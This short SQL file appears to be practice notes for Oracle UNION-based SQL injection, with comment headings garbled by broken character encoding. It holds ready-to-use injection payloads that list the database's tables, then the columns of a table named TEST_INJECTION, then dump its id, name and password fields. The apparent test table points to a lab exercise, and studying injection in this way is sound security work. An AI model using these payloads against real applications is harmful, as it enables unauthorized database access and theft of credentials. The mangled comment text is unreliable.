select* from tab;

--���̺��
aaa' union select tname,'0','0','0','0' from tab --

--�÷���
aaa' union select column_name, data_type,'0','0','0' from user_tab_cols where table_name = 'TEST_INJECTION' --

--������
aaa' union select id, name,pass,'0','0' from TEST_INJECTION --